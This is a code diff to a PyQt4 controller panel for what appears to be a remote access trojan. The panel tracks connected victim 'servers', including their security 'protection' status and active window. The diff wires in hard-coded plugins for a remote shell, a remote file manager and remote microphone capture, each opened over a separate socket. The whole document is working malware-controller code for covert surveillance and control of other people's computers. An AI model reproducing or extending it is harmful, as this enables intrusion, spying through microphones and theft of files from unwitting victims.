@@ -20,8 +20,9 @@ from PyQt4.QtCore import *
 from ui import gui
 
 from libs.modechat import get, send
-
-import plugins
+from plugins.maudio import main as maudio
+from plugins.mexplorer import main as mexplorer
+from plugins.mshell import main as mshell
 
 
 class MainDialog(QMainWindow, gui.Ui_MainWindow):
@@ -42,7 +43,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.acceptthreadState = False
 
         # plugins bank
-        self.plugins = plugins.__plugins__
         self.pluginsBank = {}
 
         # initial geo ip database
@@ -91,14 +91,17 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.getPreview)
         self.unlockServerButton.clicked.connect(self.unlockServer)
-        self.remoteShellButton.clicked.connect(lambda: self.runPlugin(plugin='mshell'))
-        self.remoteExplorerButton.clicked.connect(lambda: self.runPlugin(plugin='mexplorer'))
+        self.remoteShellButton.clicked.connect(self.runShell)
+        self.remoteExplorerButton.clicked.connect(self.runExplorer)
         self.lockServerButton.clicked.connect(self.lockServer)
         self.quitServerButton.clicked.connect(self.lockServer)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
         self.connect(self, SIGNAL('updatePanel()'), self.updatePanel)
+        self.connect(self, SIGNAL('executeShell()'), self.executeShell)
+        self.connect(self, SIGNAL('executeExplorer()'), self.executeExplorer)
+        self.connect(self, SIGNAL('executeAudio()'), self.executeAudio)
 
     # Start Listen for Servers
     def startListen(self):
@@ -149,7 +152,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 return
             if self.sock:
 
-                if get(self.sock, 'CHECK SOCKET STATUS', 'status') == 'parent':
+                data = get(self.sock, 'myinfo', 'status')
+
+                if data == 'parent':
 
                     data = get(self.sock, 'info', 'pcinfo')
                     info = ast.literal_eval(data)
@@ -170,23 +175,36 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     self.socks[socketIndex]['version'] = info['version']
                     self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']
 
-                    data = get(self.sock, 'startChildSocket', 'socket')
-                    if bool(data):
-                        while 1:
-                            self.sock, self.address = self.c.accept()
-                            if get(self.sock, 'CHECK SOCKET STATUS', 'status') == 'child':
+                    data = get(self.sock, 'startChildSocket %s' % socketIndex, 'streamingMode')
+
+                else:
+                    mode, index = data.split(' ')
+                    try:
+                        if self.socks.has_key(int(index)):
+                            i = int(index)
+
+                            if mode == 'streamingMode':
+
                                 data = get(self.sock, 'pcinfo', 'info')
                                 info = ast.literal_eval(data)
 
-                                self.streaming_socks[self.socks[socketIndex]['socket']] = {}
-                                self.streaming_socks[self.socks[socketIndex]['socket']]['sock'] = self.sock
-                                self.streaming_socks[self.socks[socketIndex]['socket']]['protection'] = info[
-                                    'protection']
-                                self.streaming_socks[self.socks[socketIndex]['socket']]['activewindowtitle'] = info[
-                                    'activewindowtitle']
+                                self.streaming_socks[i] = {}
+                                self.streaming_socks[i]['sock'] = self.sock
+                                self.streaming_socks[i]['protection'] = info['protection']
+                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                 self.emit(SIGNAL('updateTable()'))
 
-                                break
+                            elif mode == 'audioMode':
+                                self.signalAudio(self.sock)
+
+                            elif mode == 'shellMode':
+                                self.signalShell(self.sock)
+
+                            elif mode == 'explorerMode':
+                                self.signalExplorer(self.sock)
+
+                    except ValueError as e:
+                        print e
 
     # Servers Live Update
     def checkServers(self):
@@ -375,14 +393,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             server_index = self.serversTable.currentRow()
             self.eMenu = QMenu(self)
             self.optionsMenu = QMenu('Server Options', self)
+            self.optionsMenu.setIcon(QIcon(os.path.join(self.assets, 'settings.png')))
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
                 self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
 
             else:
-                for i in self.plugins:
-                    self.eMenu.addAction(QIcon(self.plugins[i]['icon']), self.plugins[i]['name'],
-                                         lambda plugin_name=i: self.runPlugin(plugin=plugin_name))
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mshell.png')), 'Shell', self.runShell)
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mexplorer.png')), 'File Manager', self.runExplorer)
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'maudio.png')), 'Microphone', self.runAudio)
 
                 self.eMenu.addSeparator()
                 self.eMenu.addMenu(self.optionsMenu)
@@ -398,20 +417,58 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def id_generator(self, size=16, chars=string.ascii_uppercase + string.digits):
         return ''.join(random.choice(chars) for _ in range(size))
 
-    # Run Plugin
-    def runPlugin(self, plugin):
-        args = {}
-        exec 'from plugins.%s.main import mainPopup' % plugin
+    def signalExplorer(self, sock):
+        self.current_sock = sock
+        self.emit(SIGNAL('executeExplorer()'))
 
+    def runExplorer(self):
         sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
-        args['sock'] = self.socks[sockind]['sock']
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'explorerMode')
+
+    def executeExplorer(self):
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
         args['socket'] = self.socks[sockind]['socket']
         args['ipAddress'] = self.socks[sockind]['ip_address']
-        args['icon'] = self.plugins[plugin]['icon']
-        args['path'] = self.plugins[plugin]['path']
-
         tmpid = self.id_generator()
-        self.pluginsBank[tmpid] = mainPopup(args=args)
+        self.pluginsBank[tmpid] = mexplorer.mainPopup(args=args)
+        self.pluginsBank[tmpid].show()
+
+    def signalAudio(self, sock):
+        self.current_sock = sock
+        self.emit(SIGNAL('executeAudio()'))
+
+    def runAudio(self):
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'audioMode')
+
+    def executeAudio(self):
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        args['socket'] = self.socks[sockind]['socket']
+        args['ipAddress'] = self.socks[sockind]['ip_address']
+        tmpid = self.id_generator()
+        self.pluginsBank[tmpid] = maudio.mainPopup(args=args)
+        self.pluginsBank[tmpid].show()
+
+    def signalShell(self, sock):
+        self.current_sock = sock
+        self.emit(SIGNAL('executeShell()'))
+
+    def runShell(self):
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'shellMode')
+
+    def executeShell(self):
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        args['socket'] = self.socks[sockind]['socket']
+        args['ipAddress'] = self.socks[sockind]['ip_address']
+        tmpid = self.id_generator()
+        self.pluginsBank[tmpid] = mshell.mainPopup(args=args)
         self.pluginsBank[tmpid].show()
 
     def closeEvent(self, event):
